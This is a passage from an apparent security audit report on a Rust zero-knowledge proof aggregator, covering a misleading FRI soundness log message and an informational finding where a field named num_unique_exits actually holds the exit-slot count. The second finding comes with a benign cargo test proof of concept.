When both `--rate-bits` and `--num-query-rounds` are supplied, `build()` first sets `num_query_rounds` from the rate-bits auto-rebalance and prints `[config] rate_bits X -> Y, auto-adjusted num_query_rounds A -> B (preserving FRI soundness product P)`. Later in the same function the explicit `--num-query-rounds` branch overwrites `cfg.fri_config.num_query_rounds` with the user-supplied value, so the query-round count and effective soundness product actually applied differ from the ones the earlier message announced. The printed "preserving FRI soundness product" line is therefore inaccurate for that flag combination, and the summary a profiler user reads no longer reflects the config that was built.

## Root cause

The `rate_bits` branch emits a definitive "preserving FRI soundness product" log before a later branch can override `num_query_rounds`, so the message is printed unconditionally rather than reflecting the final resolved value.

## Impact

An operator combining the two flags is told the FRI soundness product was preserved while the explicit override silently lowers `num_query_rounds` (and thus the product). This is a diagnostic log-accuracy issue only; the explicit override still requires `--allow-weakening-security`, so the user has already acknowledged a security-weakening change, and no proof artifact leaves the tool.

---

# Aggregated header field mislabeled as unique exits
**#97000**
- Severity: Info
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs`
#### Lines 151-153 — _emits n_leaf*2 as num_exit_slots_

```

    // Output: [num_exit_slots, asset_id, volume_fee_bps, block_hash(4), block_number, ...]
    let num_exit_slots_t = builder.constant(F::from_canonical_u64((n_leaf * 2) as u64));
```

### `wormhole/inputs/src/lib.rs` (2 locations)
#### Lines 203-206 — _field labeled num_unique_exits_

```
pub struct PrivateBatchPublicInputs {
    /// Number of unique exit-account groups reported by the wrapper circuit.
    /// This is informational only; semantic validation remains the circuit's responsibility.
    pub num_unique_exits: u32,
```

⋯
#### Lines 365-367 — _parses index 0 as num_unique_exits_

```
        let num_unique_exits: u32 = pis[0]
            .try_into()
            .context("AggregatedPI: num_unique_exits at index 0 exceeds u32 range")?;
```

## Description

The first field of the private-batch aggregated output is the total exit-slot count, computed as `n_leaf * 2` and registered as `num_exit_slots`. The shared `PrivateBatchPublicInputs` type that parses this layout stores index 0 as `num_unique_exits`. Because duplicate exit accounts are zeroed in place but their slots remain present in the output, the emitted value is the fixed slot count (2N), not the number of distinct payout accounts. Any consumer that trusts the parsed field name to mean distinct exits is working from an incorrect semantic.

## Root cause

Naming/semantic mismatch between the circuit output (`num_exit_slots = 2N`) and the parsed public-input field name `num_unique_exits`.

## Impact

A downstream consumer that interprets `num_unique_exits` as the count of distinct payout accounts instead receives the total slot count 2N, which can drive incorrect accounting, display, or validation assumptions. There is no direct fund impact because the value still equals the correct number of exit slots to iterate.

## Proof of concept

### Test case

```
use std::collections::BTreeSet;
use std::path::Path;
use std::sync::Once;

use circuit_builder::generate_all_circuit_binaries;
use plonky2::field::types::PrimeField64;
use qp_wormhole_inputs::{BytesDigest, PrivateBatchPublicInputs};
use test_helpers::TestInputs;
use wormhole_aggregator::aggregator::{AggregationBackend, PrivateBatchAggregator};
use wormhole_circuit::block_header::header::HeaderInputs;
use wormhole_circuit::inputs::CircuitInputs;
use wormhole_prover::WormholeProver;

const TEST_OUTPUT_DIR: &str = "tmp-poc-bins";
static TEST_INIT: Once = Once::new();

fn setup_test_binaries() {
    TEST_INIT.call_once(|| {
        generate_all_circuit_binaries(TEST_OUTPUT_DIR, true, 2, None)
            .expect("failed to generate private-batch test binaries");
    });
}

fn make_non_dummy_leaf_with_real_block_hash() -> CircuitInputs {
    let mut inputs = CircuitInputs::test_inputs_0();

    inputs.public.output_amount_1 = inputs.private.input_amount.saturating_sub(1);
    inputs.public.output_amount_2 = 0;

    let header = HeaderInputs::try_from(&inputs).expect("header inputs should build");
    inputs.public.block_hash = header.block_hash();

    inputs
}

#[test]
fn private_batch_parser_reports_slot_count_not_distinct_exit_count() {
    setup_test_binaries();

    let inputs = make_non_dummy_leaf_with_real_block_hash();

    let prover = WormholeProver::new_from_files(
        Path::new(&format!("{TEST_OUTPUT_DIR}/prover.bin")),
        Path::new(&format!("{TEST_OUTPUT_DIR}/common.bin")),
    )
    .expect("failed to load leaf prover");

    let proof = prover
        .commit(&inputs)
        .expect("failed to commit leaf inputs")
        .prove()
        .expect("failed to prove leaf inputs");

    let mut aggregator = PrivateBatchAggregator::new(TEST_OUTPUT_DIR).expect("aggregator loads");
    aggregator.push_proof(proof.clone()).expect("first proof accepted");
    aggregator.push_proof(proof).expect("second proof accepted");

    let aggregated = aggregator.aggregate().expect("aggregation succeeds");
    aggregator
        .verify(aggregated.clone())
        .expect("aggregated proof verifies");

    let aggregated_u64s: Vec<u64> = aggregated
        .public_inputs
        .iter()
        .map(|felt| felt.to_canonical_u64())
        .collect();
    let parsed = PrivateBatchPublicInputs::try_from_u64_slice(&aggregated_u64s)
        .expect("aggregated public inputs should parse");

    let zero_digest = BytesDigest::default();
    let distinct_nonzero_payout_accounts: BTreeSet<BytesDigest> = parsed
        .account_data
        .iter()
        .filter(|slot| slot.summed_output_amount != 0 && slot.exit_account != zero_digest)
        .map(|slot| slot.exit_account)
        .collect();

    assert_eq!(parsed.num_unique_exits as usize, parsed.account_data.len());
    assert!(
        parsed.num_unique_exits as usize > distinct_nonzero_payout_accounts.len(),
        "parser field named num_unique_exits should exceed the actual distinct non-zero payout accounts when duplicate exits are zeroed in place"
    );
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc -- --nocapture
```

### Output

```
[output truncated: 46 lines & 1.876953125 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.43s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

PoC demonstrates the mismatch end-to-end through real public entry points (`WormholeProver::new_from_files` → `PrivateBatchAggregator::push_proof/aggregate/verify` → `PrivateBatchPublicInputs::try_from_u64_slice`) using two valid non-dummy leaf proofs with the same payout account, proving the parsed `num_unique_exits` exceeds the actual distinct non-zero payout accounts in the aggregated output. It does not demonstrate downstream accounting loss because the reported impact depends on an external consumer misinterpreting this informational field.

### Validation reasoning

PoC validation command completed successfully.
